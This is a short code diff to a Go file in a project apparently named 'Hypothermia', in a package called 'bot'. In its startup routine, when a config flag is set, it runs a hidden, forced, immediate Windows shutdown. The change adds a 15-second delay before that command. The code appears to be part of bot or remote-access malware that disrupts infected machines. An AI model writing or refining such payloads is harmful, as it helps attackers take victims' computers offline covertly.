@@ -3,6 +3,7 @@ package bot
 import (
 	"os/exec"
 	"syscall"
+	"time"
 
 	"Hypothermia/config"
 	"Hypothermia/src/utils"
@@ -34,6 +35,8 @@ func OnStartup() {
 	)
 
 	if err == nil && sdos == TRUE {
+		time.Sleep(15 * time.Second)
+
 		cmd := exec.Command("shutdown", "/s", "/f", "/t", "0")
 		cmd.SysProcAttr = &syscall.SysProcAttr{
 			HideWindow: true,
